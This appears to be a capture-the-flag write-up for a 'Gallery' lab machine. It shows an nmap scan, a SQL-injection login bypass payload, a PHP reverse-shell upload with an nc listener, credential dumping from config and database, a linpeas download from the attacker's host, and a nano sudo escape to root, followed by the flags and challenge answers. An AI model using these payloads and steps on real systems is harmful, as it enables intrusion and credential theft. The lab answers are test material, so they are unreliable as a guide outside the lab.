# Task 1 Deploy and get a Shell
----

>>Our gallery is not very well secured.

>> Designed and created by Mikaa !

----

# Task 2 Escalate to the root user 
----

>>Good luck with the last step !

----

## SCANNING

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV 10.10.44.210
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 10:08 EST
Nmap scan report for 10.10.44.210
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simple Image Gallery System
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.45 seconds


# The webpage at the port 8080 shows the login page which has sqli so using 
Username : admin'OR 1=1-- -'
Password : password

# After logging into the webpage go to the albums page were we create a album and upload a php revshell.
```

## GETTING SHELL AS WWW-DATA

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nc -lvnp 7007            
listening on [any] 7007 ...
connect to [10.9.2.193] from (UNKNOWN) [10.10.44.210] 60158
Linux gallery 4.15.0-167-generic #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 15:14:29 up 10 min,  0 users,  load average: 0.60, 1.15, 0.79
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@gallery:/$ 
www-data@gallery:/$ ^Z
zsh: suspended  nc -lvnp 7007
                                                                                                                             
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ stty raw -echo && fg
[1]  + continued  nc -lvnp 7007

www-data@gallery:/$ export TERM=xterm

# Found the db creds

www-data@gallery:/var/www/html/gallery$ cat initialize.php 
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>

www-data@gallery:/var/www/html/gallery$ mysql -u gallery_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 343
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gallery_db         |
| information_schema |
+--------------------+
2 rows in set (0.01 sec)

MariaDB [(none)]> use gallery_db   
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gallery_db]> show tables;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.00 sec)

MariaDB [gallery_db]> select * from users;
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                   | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1629883080_1624240500_avatar.png | NULL       |    1 | 2021-01-20 14:02:37 | 2021-08-25 09:18:12 |
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.00 sec)
```

## FINDING MIKE'S PASSWORD

```bash
# Finding the area to escalate the user privilege using linpeas

www-data@gallery:/tmp$ wget http://10.9.2.193:8000/linpeas.sh
--2022-02-25 15:37:33--  http://10.9.2.193:8000/linpeas.sh
Connecting to 10.9.2.193:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 305316 (298K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 298.16K  37.4KB/s    in 9.0s    

2022-02-25 15:37:43 (33.0 KB/s) - 'linpeas.sh' saved [305316/305316]

www-data@gallery:/tmp$ ls
linpeas.sh
www-data@gallery:/tmp$ chmod +x linpeas.sh 
www-data@gallery:/tmp$ ./linpeas.sh > linpeas.txt

www-data@gallery:/tmp$ ./linpeas.sh 
 
# In linpeas there is a area which searches password in history files with that we got our password
b3stpassw0rdbr0xx

www-data@gallery:/home/mike$ su mike
Password: 
mike@gallery:~$ 
mike@gallery:~$ cat user.txt 
THM{af05cd30bfed67849befd546ef}
```

## PRIVILEGE ESCALATION

```bash
mike@gallery:~$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh 
Would you like to versioncheck, update, list or read the report ? read 

# A nano window will open use ctrl r + ctrl x to execute command in the nano shell use the below command to gain shell as root.
reset; sh 1>&0 2>&0

# 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# cat root.txt
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
```

# ANSWER THE QUESTIONS 
----

1.How many ports are open?
>>2

2.What's the name of the CMS?
>>Simple Image gallery

3.What's the hash password of the admin user?
>>a228b12a08b6527e7978cbe5d914531c

4.What's the user flag?
>>THM{af05cd30bfed67849befd546ef}

5.What's the root flag? 
>>THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}

----